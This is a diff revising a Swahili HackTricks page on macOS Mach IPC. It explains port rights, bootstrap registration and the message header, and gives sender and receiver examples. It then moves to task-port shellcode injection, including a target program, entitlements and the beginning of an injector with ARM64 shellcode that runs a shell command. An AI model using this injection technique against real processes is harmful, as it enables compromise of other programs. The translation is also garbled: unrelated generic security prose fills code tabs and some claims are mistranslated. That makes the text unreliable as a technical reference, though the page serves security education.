@@ -1,4 +1,4 @@
-# macOS IPC - Inter Process Communication
+# macOS IPC - Mawasiliano kati ya Michakato
 
 <details>
 
@@ -6,7 +6,7 @@
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -18,7 +18,7 @@ Njia nyingine za kusaidia HackTricks:
 
 ### Taarifa Msingi
 
-Mach hutumia **kazi** kama **kitengo kidogo** cha kugawana rasilimali, na kila kazi inaweza kuwa na **vijiti vingi**. Hizi **kazi na vijiti vinahusishwa 1:1 na michakato na vijiti vya POSIX**.
+Mach hutumia **kazi** kama **kitengo kidogo** cha kugawana rasilimali, na kila kazi inaweza kuwa na **vijiti vingi**. Hizi **kazi na vijiti zimepangwa 1:1 kwa michakato na vijiti vya POSIX**.
 
 Mawasiliano kati ya kazi hufanyika kupitia Mawasiliano ya Michakato ya Mach (IPC), kwa kutumia njia za mawasiliano ya njia moja. **Ujumbe hupitishwa kati ya bandari**, ambazo hufanya kama **safu za ujumbe** zinazosimamiwa na kernel.
 
@@ -28,21 +28,21 @@ Mchakato pia unaweza kutuma jina la bandari na baadhi ya haki **kwa kazi tofauti
 
 ### Haki za Bandari
 
-Haki za bandari, ambazo hufafanua ni operesheni gani kazi inaweza kufanya, ni muhimu katika mawasiliano haya. **Haki za bandari** zinaweza kuwa ([maelezo kutoka hapa](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
+Haki za bandari, ambazo hufafanua ni operesheni gani kazi inaweza kutekeleza, ni muhimu katika mawasiliano haya. **Haki za bandari** zinaweza kuwa ([maelezo kutoka hapa](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
 
-* **Haki ya Kupokea**, ambayo inaruhusu kupokea ujumbe uliotumwa kwa bandari. Bandari za Mach ni safu za MPSC (wazalishaji wengi, mtumiaji mmoja) safu, ambayo inamaanisha kwamba inaweza kuwepo **haki moja ya kupokea kwa kila bandari** katika mfumo mzima (tofauti na mabomba, ambapo michakato mingi inaweza kushikilia viambatisho vya faili kwa mwisho wa kusoma wa bomba moja).
+* **Haki ya Kupokea**, ambayo inaruhusu kupokea ujumbe uliotumwa kwa bandari. Bandari za Mach ni safu za MPSC (wazalishaji wengi, mtumiaji mmoja) safu, ambayo inamaanisha kwamba inaweza kuwepo **haki moja ya kupokea kwa kila bandari** katika mfumo mzima (tofauti na mabomba, ambapo michakato mingi inaweza kushikilia viashiria vya faili kwa mwisho wa kusoma wa bomba moja).
 * **Kazi yenye Haki ya Kupokea** inaweza kupokea ujumbe na **kuunda Haki za Kutuma**, kuruhusu kutuma ujumbe. Awali tu **kazi yenyewe ina Haki ya Kupokea juu ya bandari yake**.
 * **Haki ya Kutuma**, ambayo inaruhusu kutuma ujumbe kwa bandari.
-* Haki ya Kutuma inaweza **kufanana** hivyo kazi ikiwa na Haki ya Kutuma inaweza kufanana haki na **kuipatia kwa kazi ya tatu**.
+* Haki ya Kutuma inaweza **kufanyiwa nakala** ili kazi inayomiliki Haki ya Kutuma iweze kufanya nakala ya haki hiyo na **kuipatia kazi ya tatu**.
 * **Haki ya Kutuma mara moja**, ambayo inaruhusu kutuma ujumbe moja kwa bandari na kisha kutoweka.
-* **Haki ya Seti ya Bandari**, ambayo inaashiria _seti ya bandari_ badala ya bandari moja. Kutoa ujumbe kutoka kwa seti ya bandari kunatoa ujumbe kutoka kwa moja ya bandari inayojumuisha. Seti za bandari zinaweza kutumika kusikiliza bandari kadhaa kwa wakati mmoja, kama `chagua`/`piga kura`/`epoll`/`kqueue` katika Unix.
-* **Jina la Kufa**, ambalo sio haki halisi ya bandari, bali ni nafasi tu. Wakati bandari inaharibiwa, haki zote za bandari zilizopo kwa bandari hiyo zinageuka kuwa majina ya kufa.
+* **Haki ya seti ya bandari**, ambayo inaashiria _seti ya bandari_ badala ya bandari moja. Kutoa ujumbe kutoka kwa seti ya bandari kunatoa ujumbe kutoka kwa moja ya bandari inayojumuisha. Seti za bandari zinaweza kutumika kusikiliza bandari kadhaa kwa wakati mmoja, kama `chagua`/`piga kura`/`epoll`/`kqueue` katika Unix.
+* **Jina la kufa**, ambalo sio haki halisi ya bandari, bali ni nafasi tu. Wakati bandari inaharibiwa, haki zote za bandari zilizopo kwa bandari hiyo zinageuka kuwa majina ya kufa.
 
-**Kazi zinaweza kusafirisha HAKI ZA KUTUMA kwa wengine**, kuwaruhusu kutuma ujumbe nyuma. **HAKI ZA KUTUMA pia zinaweza kufanana**, hivyo kazi inaweza kuiga na kumpa haki kwa kazi ya tatu. Hii, pamoja na mchakato wa kati unaojulikana kama **seva ya bootstrap**, inaruhusu mawasiliano yenye ufanisi kati ya kazi.
+**Kazi zinaweza kusafirisha HAKI ZA KUTUMA kwa wengine**, kuwaruhusu kutuma ujumbe nyuma. **HAKI ZA KUTUMA pia zinaweza kunakiliwa, hivyo kazi inaweza kuzidisha na kumpa haki ya tatu**. Hii, pamoja na mchakato wa kati unaojulikana kama **seva ya bootstrap**, inaruhusu mawasiliano yenye ufanisi kati ya kazi.
 
 ### Bandari za Faili
 
-Bandari za faili huruhusu kufunga viambatisho vya faili katika bandari za Mac (kwa kutumia Haki za Bandari za Mach). Inawezekana kuunda `fileport` kutoka kwa FD iliyotolewa kwa kutumia `fileport_makeport` na kuunda FD kutoka kwa fileport kwa kutumia `fileport_makefd`.
+Bandari za faili huruhusu kufunga viashiria vya faili katika bandari za Mac (kwa kutumia Haki za Bandari za Mach). Inawezekana kuunda `fileport` kutoka kwa FD iliyotolewa kwa kutumia `fileport_makeport` na kuunda FD kutoka kwa fileport kwa kutumia `fileport_makefd`.
 
 ### Kuweka Mawasiliano
 
@@ -51,32 +51,31 @@ Bandari za faili huruhusu kufunga viambatisho vya faili katika bandari za Mac (k
 Kama ilivyotajwa, ili kuweka njia ya mawasiliano, **seva ya bootstrap** (**launchd** kwenye mac) inahusika.
 
 1. Kazi **A** inaanzisha **bandari mpya**, ikipata **HAKI YA KUPOKEA** katika mchakato.
-2. Kazi **A**, ikiwa mmiliki wa HAKI YA KUPOKEA, **inaunda HAKI YA KUTUMA kwa bandari**.
+2. Kazi **A**, ikiwa mmiliki wa HAKI YA KUPOKEA, **inazalisha HAKI YA KUTUMA kwa bandari**.
 3. Kazi **A** inaweka **mawasiliano** na **seva ya bootstrap**, ikitoa **jina la huduma ya bandari** na **HAKI YA KUTUMA** kupitia mchakato unaojulikana kama usajili wa bootstrap.
-4. Kazi **B** inashirikiana na **seva ya bootstrap** kutekeleza utaftaji wa bootstrap **kwa jina la huduma**. Ikiwa mafanikio, **seva inaiga HAKI YA KUTUMA** iliyopokelewa kutoka kwa Kazi A na **kuhamisha kwa Kazi B**.
+4. Kazi **B** inashirikiana na **seva ya bootstrap** kutekeleza utaftaji wa bootstrap **kwa jina la huduma**. Ikiwa mafanikio, **seva inanakili HAKI YA KUTUMA** iliyopokelewa kutoka kwa Kazi A na **kuhamisha kwa Kazi B**.
 5. Baada ya kupata HAKI YA KUTUMA, Kazi **B** inaweza **kutunga** **ujumbe** na kuutuma **kwa Kazi A**.
-6. Kwa mawasiliano ya pande zote kawaida kazi **B** inaunda bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).
+6. Kwa mawasiliano ya pande zote kawaida kazi **B** inazalisha bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).
 
 Seva ya bootstrap **haiwezi kuthibitisha** jina la huduma lililodaiwa na kazi. Hii inamaanisha **kazi** inaweza kwa uwezekano **kujifanya kuwa kazi yoyote ya mfumo**, kama vile **kudai jina la huduma ya idhini** na kisha kuidhinisha kila ombi.
 
-Kisha, Apple huhifadhi **majina ya huduma zilizotolewa na mfumo** katika faili za usanidi salama, zilizoko katika saraka zilizolindwa na SIP: `/System/Library/LaunchDaemons` na `/System/Library/LaunchAgents`. Pamoja na kila jina la huduma, **binary inayohusiana pia imehifadhiwa**. Seva ya bootstrap, itaunda na kushikilia **HAKI YA KUPOKEA kwa kila moja ya majina haya ya huduma**.
+Kisha, Apple inahifadhi **majina ya huduma zilizotolewa na mfumo** katika faili za usanidi salama, zilizoko katika saraka zilizolindwa na SIP: `/System/Library/LaunchDaemons` na `/System/Library/LaunchAgents`. Pamoja na kila jina la huduma, **binary inayohusishwa pia imehifadhiwa**. Seva ya bootstrap, itaunda na kushikilia **HAKI YA KUPOKEA kwa kila moja ya majina haya ya huduma**.
 
-Kwa huduma hizi zilizopangwa mapema, **mchakato wa utaftaji unatofautiana kidogo**. Wakati jina la huduma linatafutwa, launchd huanzisha huduma hiyo kwa muda. Mchakato mpya ni kama ifuatavyo:
+Kwa huduma hizi zilizopangwa mapema, **mchakato wa utaftaji unatofautiana kidogo**. Wakati jina la huduma linatafutwa, launchd huanzisha huduma hiyo kwa kudumu. Mchakato mpya ni kama ifuatavyo:
 
 * Kazi **B** inaanzisha utaftaji wa bootstrap **kwa jina la huduma**.
 * **launchd** inachunguza ikiwa kazi inaendeshwa na ikiwa haiko, **inaianzisha**.
-* Kazi **A** (huduma) inatekeleza **kuangalia bootstrap**. Hapa, \*\*seva ya bootstrap inaunda HAKI YA KUTUMA, inaishikilia, na **kuhamisha HAKI YA KUPOKEA kwa Kazi A**.
-* launchd inafanana **HAKI YA KUTUMA na kuituma kwa Kazi B**.
-* Kazi **B** inaunda bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** (huduma) ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).
+* Kazi **A** (huduma) inatekeleza **kuangalia bootstrap**. Hapa, **seva ya bootstrap inaunda HAKI YA KUTUMA, inaishikilia, na inahamisha HAKI YA KUPOKEA kwa Kazi A**.
+* launchd inanakili **HAKI YA KUTUMA na kuituma kwa Kazi B**.
+* Kazi **B** inazalisha bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** (huduma) ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).
 
-Hata hivyo, mchakato huu unatumika tu kwa kazi za mfumo zilizopangwa mapema. Kazi zisizo za mfumo bado zinaendesha kama ilivyoelezwa awali, ambayo inaweza kwa uwezekano kuruhusu udanganyifu.
+Hata hivyo, mchakato huu unatumika tu kwa kazi za mfumo zilizopangwa mapema. Kazi zisizo za mfumo bado zinaendesha kama ilivyoelezwa awali, ambayo inaweza kwa uwezekano kuruhusu udanganyifu. 
 
 ### Ujumbe wa Mach
 
-[Pata maelezo zaidi hapa](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+[Pata habari zaidi hapa](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
 
 Kazi ya `mach_msg`, kimsingi wito wa mfumo, hutumiwa kutuma na kupokea ujumbe wa Mach. Kazi inahitaji ujumbe utumwe kama hoja ya awali. Ujumbe huu lazima uanze na muundo wa `mach_msg_header_t`, ukifuatiwa na maudhui ya ujumbe halisi. Muundo unafafanuliwa kama ifuatavyo:
-
 ```c
 typedef struct {
 mach_msg_bits_t               msgh_bits;
@@ -87,38 +86,37 @@ mach_port_name_t              msgh_voucher_port;
 mach_msg_id_t                 msgh_id;
 } mach_msg_header_t;
 ```
+Mchakato unaomiliki _**haki ya kupokea**_ unaweza kupokea ujumbe kwenye mlango wa Mach. Kinyume chake, **wapelekaji** wanapewa _**haki ya kutuma**_ au _**haki ya kutuma mara moja**_. Haki ya kutuma mara moja ni kwa ajili ya kutuma ujumbe mmoja tu, baada ya hapo inakuwa batili.
 
-Mchakato unaomiliki _**haki ya kupokea**_ unaweza kupokea ujumbe kwenye mlango wa Mach. Kinyume chake, **wapelekaji** hupewa _**haki ya kutuma**_ au _**haki ya kutuma mara moja**_. Haki ya kutuma mara moja ni kwa ajili ya kutuma ujumbe mmoja tu, baada ya hapo inakuwa batili.
-
-Ili kufanikisha **mawasiliano ya pande zote** kwa urahisi, mchakato unaweza kutaja **mlango wa mach** katika **kichwa cha ujumbe** wa mach unaoitwa _mlango wa jibu_ (**`msgh_local_port`**) ambapo **mpokeaji** wa ujumbe unaweza **kutuma jibu** kwa ujumbe huu. Bitflags katika **`msgh_bits`** zinaweza kutumika kuonyesha kwamba **haki ya kutuma mara moja** inapaswa kuletwa na kuhamishiwa kwa mlango huu (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).
+Kwa lengo la kufanikisha **mawasiliano ya pande zote** kwa urahisi, mchakato unaweza kutaja **mlango wa mach** katika **kichwa cha ujumbe cha mach** kinachoitwa _mlango wa jibu_ (**`msgh_local_port`**) ambapo **mpokeaji** wa ujumbe unaweza **kutuma jibu** kwa ujumbe huu. Bitflags katika **`msgh_bits`** zinaweza kutumika kuonyesha kwamba **haki ya kutuma mara moja** inapaswa kuletwa na kuhamishiwa kwa mlango huu (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).
 
 {% hint style="success" %}
-Tafadhali elewa kuwa aina hii ya mawasiliano ya pande zote hutumiwa katika ujumbe wa XPC unaotarajia jibu (`xpc_connection_send_message_with_reply` na `xpc_connection_send_message_with_reply_sync`). Lakini **kawaida viingilio tofauti** hujengwa kama ilivyoelezwa hapo awali ili kuunda mawasiliano ya pande zote.
+Tambua kwamba aina hii ya mawasiliano ya pande zote hutumiwa katika ujumbe wa XPC unaotarajia jibu (`xpc_connection_send_message_with_reply` na `xpc_connection_send_message_with_reply_sync`). Lakini **kawaida milango tofauti hujengwa** kama ilivyoelezwa hapo awali ili kuunda mawasiliano ya pande zote.
 {% endhint %}
 
 Vitengo vingine vya kichwa cha ujumbe ni:
 
-* `msgh_size`: ukubwa wa pakiti nzima.
-* `msgh_remote_port`: mlango ambao ujumbe huu unatumwa.
-* `msgh_voucher_port`: [vifungo vya mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
-* `msgh_id`: kitambulisho cha ujumbe huu, ambacho huchambuliwa na mpokeaji.
+- `msgh_size`: ukubwa wa pakiti nzima.
+- `msgh_remote_port`: mlango ambao ujumbe huu unatumwa.
+- `msgh_voucher_port`: [vifungo vya mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
+- `msgh_id`: kitambulisho cha ujumbe huu, ambacho huchambuliwa na mpokeaji.
 
 {% hint style="danger" %}
-Tafadhali elewa kuwa **ujumbe wa mach hutumwa juu ya mlango wa mach**, ambao ni **mpokeaji mmoja**, njia ya mawasiliano ya **wapelekaji wengi** iliyojengwa ndani ya kernel ya mach. **Mchakato mwingi** unaweza **kutuma ujumbe** kwa mlango wa mach, lakini wakati wowote ni **mchakato mmoja tu unaweza kusoma** kutoka kwake.
+Tambua kwamba **ujumbe wa mach hutumwa kupitia mlango wa mach**, ambao ni njia ya mawasiliano ya **mpokeaji mmoja**, **wapeleka wengi** iliyojengwa ndani ya kiini cha mach. **Mchakato mwingi** unaweza **kutuma ujumbe** kwa mlango wa mach, lakini wakati wowote ni **mchakato mmoja tu unaweza kusoma** kutoka kwake.
 {% endhint %}
 
-### Panga viingilio
-
+### Panga milango
 ```bash
 lsmp -p <pid>
 ```
-
 Unaweza kusakinisha zana hii kwenye iOS kwa kuipakua kutoka [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)
 
 ### Mfano wa Kanuni
 
-Tafadhali angalia jinsi **mtumaji** anavyo **tenga** bandari, anajenga **haki ya kutuma** kwa jina `org.darlinghq.example` na kuituma kwa **seva ya bootstrap** wakati mtumaji alipoomba **haki ya kutuma** ya jina hilo na kuitumia kutuma **ujumbe**.
+Tafadhali angalia jinsi **mtumaji** anavyo **tenga** bandari, anajenga **haki ya kutuma** kwa jina `org.darlinghq.example` na kuituma kwa **seva ya bootstrap** wakati mtumaji alipoomba **haki ya kutuma** ya jina hilo na kuitumia kutuma ujumbe.
 
+{% tabs %}
+{% tab title="receiver.c" %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc receiver.c -o receiver
@@ -184,28 +182,31 @@ message.some_text[9] = 0;
 printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 }
 ```
+{% endtab %}
 
-#### Mawasiliano ya Mchakato wa Ndani kwenye macOS
+{% tab title="sender.c" %} 
 
-Kwenye macOS, mawasiliano ya mchakato wa ndani hufanyika kupitia njia mbalimbali za IPC kama vile Mach messages, XPC, na sockets za Unix. Mawasiliano haya yanaweza kutumiwa kwa madhumuni ya kawaida ya mawasiliano kati ya michakato au kwa kusudi la kukiuka usalama.
+### Mawasiliano ya Mchakato wa macOS
 
-Kuelewa jinsi mawasiliano ya mchakato wa ndani yanavyofanya kazi ni muhimu kwa kubaini na kuzuia mashambulizi ya kukiuka upendeleo kwenye mfumo wa macOS.
+Mawasiliano ya mchakato wa macOS inaweza kusababisha ukiukaji wa haki za mchakato. Kwa mfano, kutumia mbinu za kuvunja usalama kama vile kuingilia kati mawasiliano ya mchakato (IPC) inaweza kusababisha upandishaji wa mamlaka.
 
-Katika programu hii ya mfano, tunaonyesha jinsi mchakato mmoja unaweza kutuma ujumbe kwa mchakato mwingine kwa kutumia Mach messages. Hii ni mojawapo ya njia za kawaida za IPC kwenye macOS.
+Kwa kuzingatia hilo, ni muhimu kutekeleza hatua za kutosha za kuhakikisha usalama wa mawasiliano ya mchakato kwenye mfumo wa macOS. 
 
-Tafadhali kumbuka kuwa ufahamu wa mawasiliano ya mchakato wa ndani unaweza kusaidia katika kuboresha usalama wa mfumo wako wa macOS.
+Katika faili hii, tutajifunza jinsi ya kuzuia unyakuzi wa mawasiliano ya mchakato kwa kufanya maboresho sahihi kwenye mchakato wa macOS. 
 
-#### Jinsi ya Kutumia Programu
+### Hatua za Kuchukua
 
-1. Kuanza na kutekeleza `receiver.c` kwenye terminal.
-2. Kisha kuanza na kutekeleza `sender.c` kwenye terminal nyingine.
+1. Tumia njia za kuthibitisha mawasiliano ya mchakato.
+2. Epuka kutuma data nyeti kupitia mawasiliano ya mchakato yasiyo salama.
+3. Fanya uhakiki wa kina wa mchakato wa mawasiliano ya mchakato kwa kugundua na kurekebisha mapungufu yoyote ya usalama.
 
-Utaweza kuona jinsi mchakato wa mtumaji unavyotuma ujumbe kwa mchakato wa mpokeaji kupitia Mach messages.
+Kwa kufuata hatua hizi, unaweza kuzuia ukiukaji wa haki za mchakato kupitia mawasiliano ya mchakato kwenye mfumo wa macOS. 
 
-#### Kumbuka
+### Hitimisho
 
-Programu hii ya mfano inalenga kuelimisha tu juu ya mawasiliano ya mchakato wa ndani kwenye macOS. Tumia kwa uwajibikaji na kwa madhumuni ya elimu tu.
+Kwa kufahamu hatari za mawasiliano ya mchakato na kutekeleza hatua sahihi za usalama, unaweza kuzuia upandishaji wa mamlaka kupitia njia hii ya ukiukaji wa usalama kwenye macOS. 
 
+{% endtab %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -257,21 +258,20 @@ return 1;
 printf("Sent a message\n");
 }
 ```
-
 ### Bandari za Haki
 
-* **Bandari ya Mwenyeji**: Ikiwa mchakato ana **ruhusa ya Kutuma** kupitia bandari hii, anaweza kupata **taarifa** kuhusu **mfumo** (k.m. `host_processor_info`).
-* **Bandari ya Mwenyeji wa Privilege**: Mchakato wenye **Haki ya Kutuma** kupitia bandari hii anaweza kutekeleza **vitendo vya haki** kama vile kupakia kifurushi cha kernel. **Mchakato lazima awe na mizizi** ili kupata idhini hii.
+* **Bandari ya Mwenyeji**: Ikiwa mchakato una **ruhusa ya Kutuma** juu ya bandari hii anaweza kupata **taarifa** kuhusu **mfumo** (k.m. `host_processor_info`).
+* **Bandari ya Mwenyeji wa Haki**: Mchakato wenye **Haki ya Kutuma** juu ya bandari hii anaweza kutekeleza **vitendo vya haki** kama vile kupakia kifurushi cha kernel. **Mchakato unahitaji kuwa na mizizi** kupata idhini hii.
 * Zaidi ya hayo, ili kuita API ya **`kext_request`** ni lazima kuwa na ruhusa nyingine za **`com.apple.private.kext*`** ambazo hupewa tu programu za Apple.
-* **Bandari ya Jina la Kazi:** Toleo lisilo na haki la _bandari ya kazi_. Inahusisha kazi, lakini haimruhusu kuidhibiti. Kitu pekee kinachopatikana kupitia hii ni `task_info()`.
-* **Bandari ya Kazi** (inayoitwa pia bandari ya kernel)**:** Kwa ruhusa ya Kutuma kupitia bandari hii, ni rahisi kudhibiti kazi (kusoma/kuandika kumbukumbu, kuunda nyuzi...).
-* Piga `mach_task_self()` ili **kupata jina** la bandari hii kwa kazi ya mwito. Bandari hii inarithiwa tu wakati wa **`exec()`**; kazi mpya iliyoanzishwa na `fork()` hupata bandari mpya ya kazi (kama kesi maalum, kazi pia hupata bandari mpya ya kazi baada ya `exec()` katika faili ya suid). Njia pekee ya kuzalisha kazi na kupata bandari yake ni kufanya ["ngoma ya kubadilisha bandari"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) wakati wa kufanya `fork()`.
-* Hizi ni vizuizi vya kupata bandari (kutoka `macos_task_policy` kutoka kwa programu ya `AppleMobileFileIntegrity`):
-* Ikiwa programu ina **ruhusa ya `com.apple.security.get-task-allow`**, mchakato kutoka kwa **mtumiaji huyo anaweza kupata bandari ya kazi** (kawaida huongezwa na Xcode kwa ajili ya kurekebisha makosa). Mchakato wa **kuidhinisha** hautaruhusu hili kwa matoleo ya uzalishaji.
-* Programu zenye **ruhusa ya `com.apple.system-task-ports`** zinaweza kupata **bandari ya kazi kwa mchakato wowote**, isipokuwa kernel. Katika toleo za zamani ilikuwa inaitwa **`task_for_pid-allow`**. Hii inatolewa tu kwa programu za Apple.
-* **Mizizi inaweza kupata bandari za kazi** za programu **zisizotengenezwa** na **muda wa kukimbia ulioimarishwa** (na sio kutoka kwa Apple).
+* **Bandari ya Jina la Kazi:** Toleo lisiloruhusiwa la _bandari ya kazi_. Inahusisha kazi, lakini haimruhusu kuidhibiti. Kitu pekee kinachopatikana kupitia hii ni `task_info()`.
+* **Bandari ya Kazi** (inayoitwa pia bandari ya kernel)**:** Ikiwa una ruhusa ya Kutuma juu ya bandari hii ni rahisi kudhibiti kazi (kusoma/kuandika kumbukumbu, kuunda nyuzi...).
+* Piga `mach_task_self()` ili **kupata jina** la bandari hii kwa kazi ya mwito. Bandari hii inarithiwa tu wakati wa **`exec()`**; kazi mpya iliyoanzishwa na `fork()` inapata bandari mpya ya kazi (kama kesi maalum, kazi pia inapata bandari mpya ya kazi baada ya `exec()` katika binary ya suid). Njia pekee ya kuzindua kazi na kupata bandari yake ni kufanya ["ngoma ya kubadilisha bandari"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) wakati wa kufanya `fork()`.
+* Hizi ni vizuizi vya kupata bandari (kutoka `macos_task_policy` kutoka kwa binary ya `AppleMobileFileIntegrity`):
+* Ikiwa programu ina **ruhusa ya `com.apple.security.get-task-allow`** mchakato kutoka kwa **mtumiaji huyo unaweza kupata bandari ya kazi** (kawaida huongezwa na Xcode kwa ajili ya kurekebisha makosa). Mchakato wa **kuidhinisha** hautaruhusu hii kwa matoleo ya uzalishaji.
+* Programu zenye **ruhusa ya `com.apple.system-task-ports`** inaweza kupata **bandari ya kazi kwa mchakato wowote**, isipokuwa kernel. Katika toleo za zamani ilikuwa inaitwa **`task_for_pid-allow`**. Hii inatolewa tu kwa programu za Apple.
+* **Mizizi inaweza kupata bandari za kazi** za programu **zisizotengenezwa** na **muda wa kukimbia ulioimarishwa** (na sio kutoka Apple).
 
-### Uingizaji wa Shellcode katika mnyororo kupitia Bandari ya Kazi
+### Uingizaji wa Shellcode katika nyuzi kupitia Bandari ya Kazi
 
 Unaweza kupata shellcode kutoka:
 
@@ -279,6 +279,8 @@ Unaweza kupata shellcode kutoka:
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
 {% endcontent-ref %}
 
+{% tabs %}
+{% tab title="mysleep.m" %}
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
@@ -308,26 +310,35 @@ performMathOperations();  // Silent action
 return 0;
 }
 ```
+{% endtab %}
 
-#### Maelezo
+{% tab title="entitlements.plist" %} 
+### Maelezo
 
-Faili hii ina orodha ya ruhusa zinazohitajika na programu ili kufanya kazi fulani kwenye mfumo wa macOS. Kila ruhusa ina jina lake na maelezo ya kina ya kazi inayoruhusiwa kufanywa na programu hiyo.
+Faili hii inaonyesha mifumo ya ruhusa zilizowekwa kwa programu. Inaweza kusaidia kubaini upungufu wa usalama au fursa za kuboresha usalama wa programu.
 
-#### Mfano
+### Jinsi ya Kutumia
+
+1. Fungua faili `entitlements.plist` kwenye mhariri wa maandishi.
+2. Angalia ruhusa zilizowekwa kwa programu.
+3. Hakikisha ruhusa zote zinazohitajika zimewekwa na hakuna ruhusa zisizohitajika.
+4. Fanya marekebisho kulingana na mahitaji ya usalama.
+
+### Mifano
 
 ```xml
-<key>com.apple.security.files.user-selected.read-write</key>
+<key>com.apple.security.app-sandbox</key>
 <true/>
-<key>com.apple.security.print</key>
+<key>com.apple.security.cs.allow-jit</key>
+<true/>
+<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
 <true/>
 ```
 
-#### Maagizo
+### Tahadhari
 
-1. Hakikisha kuwa ruhusa zote zilizoorodheshwa ni muhimu kwa utendaji wa programu.
-2. Epuka kuongeza ruhusa zisizohitajika ambazo zinaweza kuongeza hatari ya usalama.
-3. Fanya uhakiki wa mara kwa mara wa ruhusa zilizoorodheshwa ili kudumisha usalama wa mfumo.
-
+Hakikisha kufanya marekebisho kwa uangalifu ili kuepuka kuharibu utendaji au usalama wa programu.
+{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -337,153 +348,553 @@ Faili hii ina orodha ya ruhusa zinazohitajika na programu ili kufanya kazi fulan
 </dict>
 </plist>
 ```
-
-**Kupasha** programu iliyopita na kuongeza **haki za kufanya kazi** ili uweze kuingiza msimbo na mtumiaji huyo huyo (kama sivyo utahitaji kutumia **sudo**).
+**Kusanya** programu iliyopita na ongeza **haki** ili uweze kuingiza msimbo na mtumiaji huyo huyo (ikiwa sivyo utahitaji kutumia **sudo**).
 
 <details>
 
 <summary>sc_injector.m</summary>
+```objectivec
+// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
-\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector
+#import <Foundation/Foundation.h>
+#import <AppKit/AppKit.h>
+#include <mach/mach_vm.h>
+#include <sys/sysctl.h>
 
-\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>
 
-\#ifdef **arm64**
+#ifdef __arm64__
 
-kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );
+kern_return_t mach_vm_allocate
+(
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
+);
 
-kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );
+kern_return_t mach_vm_write
+(
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
+);
 
-\#else #include \<mach/mach\_vm.h> #endif
 
-\#define STACK\_SIZE 65536 #define CODE\_SIZE 128
+#else
+#include <mach/mach_vm.h>
+#endif
 
-// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";
 
-int inject(pid\_t pid){
+#define STACK_SIZE 65536
+#define CODE_SIZE 128
 
-task\_t remoteTask;
+// ARM64 shellcode that executes touch /tmp/lalala
